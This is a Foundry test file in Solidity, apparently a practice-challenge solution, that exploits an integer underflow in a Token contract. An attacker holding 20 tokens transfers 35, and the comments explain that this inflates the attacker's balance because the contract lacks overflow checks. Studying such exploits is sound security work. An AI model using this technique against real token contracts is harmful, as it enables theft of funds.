// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.6.0;

import "forge-std/Test.sol";
import "../src/Token.sol";

contract TokenTest is Test{
    Token token;

    address attacker = mkaddr("attacker");
    address account = mkaddr("account");

    function setUp() public {
        token = new Token(30000000000000000000000);
        token.transfer(attacker, 20);
        assertEq(token.balanceOf(attacker), 20);
    }

    function testToken() public {
        vm.startPrank(attacker);
        token.balanceOf(attacker);
        //Note, attacker doesn't have up to 35 token to transfer to address account
        //but transfering 35 will lead to an underflow which will lead to an increment in the attacker's balance
        //because there was no protection against integer overflow/underflow in the code
        token.transfer(account, 35);
        token.balanceOf(attacker);
        token.balanceOf(account);
        vm.stopPrank();
    }

    function mkaddr(string memory name) public returns (address) {
        address addr = address(
            uint160(uint256(keccak256(abi.encodePacked(name))))
        );
        vm.label(addr, name);
        return addr;
    }
}